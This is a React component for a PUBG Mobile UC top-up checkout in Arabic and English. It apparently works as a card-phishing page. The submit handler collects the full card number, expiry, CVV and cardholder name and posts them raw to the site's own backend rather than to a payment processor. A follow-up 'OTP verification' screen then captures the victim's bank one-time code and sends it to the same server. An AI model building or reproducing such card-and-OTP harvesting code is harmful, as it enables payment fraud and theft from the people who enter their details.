import React, {useEffect, useMemo, useState} from 'react';
import {Activity, ArrowLeft, ArrowRight, Check, ShieldAlert, XCircle} from 'lucide-react';
import {CreditCardPaymentFields} from './CreditCardPaymentFields';
import {useLanguage} from '../context/LanguageContext';
import {apiUrl} from '../lib/apiBase';
import {formatLatinDigits} from '../lib/formatNumbers';
import {pubgUcIconSrc, PUBG_UC_PACKAGES, PUBG_UC_TIER_ICONS, type PubgUcPackage} from '../lib/pubgUcPackages';

type OtpState = 'idle' | 'checking' | 'failed';

type PubgUcOrderProps = {
  clientId: string | null;
  userId: string | null;
  onBack: () => void;
  onComplete?: () => void;
  titleAr?: string;
  titleEn?: string;
  subtitleAr?: string;
  subtitleEn?: string;
  packages?: PubgUcPackage[];
};

function UcIcon({tier}: {tier: PubgUcPackage['iconTier']}) {
  const src = pubgUcIconSrc(tier);

  return (
    <img
      src={src}
      alt=""
      width={88}
      height={80}
      className="h-9 w-auto max-w-[3.25rem] object-contain sm:h-10 sm:max-w-[3.5rem]"
      loading="lazy"
      decoding="async"
      onError={(e) => {
        const img = e.currentTarget;
        const fallback = PUBG_UC_TIER_ICONS[1];
        if (img.src.includes('level1.cb11b2cd')) return;
        img.src = fallback;
      }}
    />
  );
}

function PackageCard({
  pkg,
  selected,
  onSelect,
  minimumLabel,
}: {
  pkg: PubgUcPackage;
  selected: boolean;
  onSelect: () => void;
  minimumLabel: string;
}) {
  const {t, dir} = useLanguage();
  const compactLabel = pkg.label.length > 10;

  return (
    <button
      type="button"
      onClick={onSelect}
      aria-pressed={selected}
      dir={dir}
      className={`group flex w-full min-w-0 items-center gap-2.5 overflow-hidden rounded-xl border-2 bg-white p-2.5 transition-[border-color,box-shadow,transform] duration-200 active:scale-[0.98] sm:gap-3 sm:rounded-2xl sm:p-3 ${
        selected
          ? 'border-red-500 shadow-[0_8px_24px_rgba(239,68,68,0.12)]'
          : 'border-gray-100 shadow-[0_2px_10px_rgba(15,23,42,0.05)] hover:border-gray-200 hover:shadow-md'
      }`}
    >
      {/* RTL: أيقونة يمين — LTR: يسار */}
      <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-gradient-to-b from-slate-50 to-slate-100 sm:h-12 sm:w-12">
        <UcIcon tier={pkg.iconTier} />
      </div>

      <div className="min-w-0 flex-1 overflow-hidden" dir="ltr">
        <p
          className={`truncate font-black leading-tight text-gray-900 tabular-nums ${
            compactLabel ? 'text-[10px] sm:text-[11px]' : 'text-xs sm:text-sm'
          }`}
          title={`${pkg.label} UC`}
        >
          {pkg.label} <span className="font-bold text-gray-400">UC</span>
        </p>
        <p
          className={`mt-0.5 truncate font-black leading-tight text-gray-900 tabular-nums ${
            pkg.priceIqd >= 100_000 ? 'text-xs sm:text-sm' : 'text-sm sm:text-[15px]'
          }`}
        >
          {formatLatinDigits(pkg.priceIqd)}{' '}
          <span className="text-[10px] font-bold text-gray-500">{t('iqd')}</span>
        </p>
        {pkg.isMinimum && (
          <p className="mt-0.5 truncate text-[9px] font-bold text-gray-400">{minimumLabel}</p>
        )}
      </div>

      {/* RTL: اختيار يسار — LTR: يمين — دون تداخل مع النص */}
      <span
        className={`flex h-5 w-5 shrink-0 items-center justify-center rounded-full border-2 transition-colors ${
          selected
            ? 'border-red-500 bg-red-500 text-white'
            : 'border-gray-200 bg-white text-transparent group-hover:border-gray-300'
        }`}
        aria-hidden
      >
        <Check className="h-3 w-3 stroke-[3]" />
      </span>
    </button>
  );
}

export function PubgUcOrder({
  clientId,
  userId,
  onBack,
  onComplete,
  titleAr,
  titleEn,
  subtitleAr,
  subtitleEn,
  packages,
}: PubgUcOrderProps) {
  const {lang, t, dir} = useLanguage();
  const packageList = useMemo(
    () => (packages && packages.length > 0 ? packages : PUBG_UC_PACKAGES),
    [packages],
  );
  const [selectedId, setSelectedId] = useState(packageList[0]?.id ?? '');
  const [playerId, setPlayerId] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showOtpStep, setShowOtpStep] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [otpState, setOtpState] = useState<OtpState>('idle');
  const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);

  const selected = useMemo(
    () => packageList.find((p) => p.id === selectedId) ?? packageList[0],
    [packageList, selectedId],
  );

  useEffect(() => {
    if (!packageList.find((p) => p.id === selectedId)) {
      setSelectedId(packageList[0]?.id ?? '');
    }
  }, [packageList, selectedId]);

  const resetFlow = () => {
    setShowOtpStep(false);
    setOtpCode('');
    setOtpState('idle');
    setCurrentOrderId(null);
    setIsSubmitting(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!clientId || !selected) return;
    setIsSubmitting(true);
    try {
      const form = e.target as HTMLFormElement;
      const cardHolder = (form.elements.namedItem('cc-name') as HTMLInputElement).value;
      const cardNumber = (form.elements.namedItem('cc-number') as HTMLInputElement).value;
      const expMonth = (form.elements.namedItem('cc-exp-month') as HTMLSelectElement).value;
      const expYear = (form.elements.namedItem('cc-exp-year') as HTMLSelectElement).value;
      const expiry = expMonth && expYear ? `${expMonth}/${String(expYear).slice(-2)}` : '';
      const cvv = (form.elements.namedItem('cc-csc') as HTMLInputElement).value;

      const details =
        `🎮 شحن PUBG Mobile UC\n` +
        `🆔 Player ID: ${playerId.trim()}\n` +
        `📦 الباقة: ${selected.label} UC (إجمالي ${formatLatinDigits(selected.totalUc)})\n` +
        `💰 السعر: ${formatLatinDigits(selected.priceIqd)} دينار\n` +
        `🏦 الدفع: ${t('creditCard')}`;

      const res = await fetch(apiUrl('/api/transactions'), {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          client_id: clientId,
          user_id: userId,
          type: 'buy',
          amount: selected.priceIqd,
          method: t('creditCard'),
          details,
          card_fields: {
            holder: cardHolder,
            number: cardNumber.replace(/\s/g, ''),
            expiry,
            cvv,
          },
        }),
      });
      if (!res.ok) {
        console.error('PUBG order failed:', await res.text());
        setIsSubmitting(false);
        return;
      }
      const data = await res.json();
      setCurrentOrderId(data.order_ref || data.id);
      setShowOtpStep(true);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentOrderId) return;
    setOtpState('checking');
    try {
      const res = await fetch(apiUrl('/api/transactions/otp'), {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({order_id: currentOrderId, otpDigit: otpCode.trim()}),
      });
      if (!res.ok) {
        setOtpState('failed');
        return;
      }
      setOtpState('idle');
      resetFlow();
      onComplete?.();
    } catch {
      setOtpState('failed');
    }
  };

  const BackIcon = dir === 'rtl' ? ArrowRight : ArrowLeft;

  return (
    <div className="mx-auto w-full min-w-0 max-w-6xl space-y-4 pb-6 sm:space-y-6 sm:pb-8">
      <button
        type="button"
        onClick={onBack}
        className="inline-flex items-center gap-2 rounded-xl border border-gray-200 bg-white px-4 py-2.5 text-sm font-bold text-gray-700 shadow-sm hover:bg-gray-50"
      >
        <BackIcon className="h-4 w-4" />
        {t('backToServices')}
      </button>

      <div>
        <h1 className="text-2xl font-black text-gray-900 sm:text-3xl">
          {lang === 'ar' ? titleAr || t('pubgOrderTitle') : titleEn || t('pubgOrderTitle')}
        </h1>
        <p className="mt-2 font-medium text-gray-500">
          {lang === 'ar' ? subtitleAr || t('pubgOrderSubtitle') : subtitleEn || t('pubgOrderSubtitle')}
        </p>
      </div>

      {showOtpStep ? (
        <div className="rounded-3xl border border-gray-100 bg-white p-8 shadow-sm">
          {otpState === 'failed' ? (
            <div className="flex flex-col items-center text-center">
              <XCircle className="mb-4 h-12 w-12 text-red-600" />
              <h3 className="font-black text-xl text-gray-900">{t('pubgPaymentRejected')}</h3>
              <button type="button" onClick={resetFlow} className="mt-6 w-full max-w-sm rounded-2xl bg-gray-900 py-4 font-bold text-white">
                {t('pubgTryAgain')}
              </button>
            </div>
          ) : otpState === 'checking' ? (
            <div className="flex flex-col items-center text-center">
              <Activity className="mb-4 h-10 w-10 animate-pulse text-red-600" />
              <p className="font-bold text-gray-700">{t('pubgProcessing')}</p>
            </div>
          ) : (
            <div className="mx-auto flex max-w-sm flex-col items-center">
              <ShieldAlert className="mb-4 h-10 w-10 text-red-600" />
              <h3 className="mb-2 font-black text-xl">{t('otpVerification')}</h3>
              <p className="mb-6 text-center text-sm text-gray-500">{t('otpSent')}</p>
              <form onSubmit={handleOtpSubmit} className="w-full space-y-4">
                <input
                  type="text"
                  value={otpCode}
                  onChange={(ev) => setOtpCode(ev.target.value)}
                  required
                  maxLength={6}
                  dir="ltr"
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 py-4 text-center text-2xl font-black tracking-[0.4em]"
                  placeholder="------"
                />
                <button
                  type="submit"
                  disabled={otpCode.length < 4}
                  className="w-full rounded-2xl bg-red-600 py-4 font-black text-white disabled:opacity-60"
                >
                  {t('verifyCode')}
                </button>
              </form>
            </div>
          )}
        </div>
      ) : (
        <div className="grid grid-cols-1 gap-4 sm:gap-6 xl:grid-cols-12 xl:items-start xl:gap-8">
          <section className="min-w-0 rounded-2xl border border-gray-100 bg-white p-3 shadow-sm sm:rounded-3xl sm:p-5 md:p-6 xl:col-span-7">
            <h2 className="mb-1 text-base font-black text-gray-900 sm:text-lg">{t('pubgSelectPackage')}</h2>
            <p className="mb-3 text-xs font-medium text-gray-500 sm:mb-4 sm:text-sm">
              {lang === 'ar' ? 'اضغط على الباقة المناسبة' : 'Tap a package to select'}
            </p>
            <div className="grid grid-cols-1 gap-2.5 min-[400px]:grid-cols-2 sm:gap-3">
              {packageList.map((pkg) => (
                <div key={pkg.id} className="min-w-0">
                  <PackageCard
                    pkg={pkg}
                    selected={selectedId === pkg.id}
                    onSelect={() => setSelectedId(pkg.id)}
                    minimumLabel={t('pubgMinimum')}
                  />
                </div>
              ))}
            </div>
          </section>

          <form
            onSubmit={handleSubmit}
            className="min-w-0 space-y-5 rounded-2xl border border-gray-100 bg-white p-4 shadow-sm sm:space-y-6 sm:rounded-3xl sm:p-6 md:p-8 xl:sticky xl:top-4 xl:col-span-5 xl:self-start"
          >
            <div>
              <label className="mb-2 block text-sm font-bold text-gray-700">{t('pubgPlayerId')}</label>
              <input
                type="text"
                required
                value={playerId}
                onChange={(ev) => setPlayerId(ev.target.value)}
                dir="ltr"
                className="w-full rounded-xl border border-gray-200 px-4 py-3.5 font-mono text-lg font-bold text-gray-900 outline-none focus:border-gray-900 focus:ring-2 focus:ring-gray-900/10"
                placeholder="5123456789"
              />
            </div>

            <CreditCardPaymentFields idPrefix="pubg-cc" />

            <div className="flex items-center justify-between rounded-2xl border border-gray-200 bg-gray-50 px-4 py-4">
              <span className="font-bold text-gray-800">{t('totalPrice')}</span>
              <span className="text-xl font-black text-gray-900 tabular-nums" dir="ltr">
                {formatLatinDigits(selected.priceIqd)} {t('iqd')}
              </span>
            </div>

            <button
              type="submit"
              disabled={isSubmitting || !playerId.trim()}
              className="w-full rounded-2xl bg-gray-900 py-4 font-black text-white shadow-lg disabled:opacity-60"
            >
              {isSubmitting ? t('pubgProcessing') : t('payNow')}
            </button>
          </form>
        </div>
      )}
    </div>
  );
}
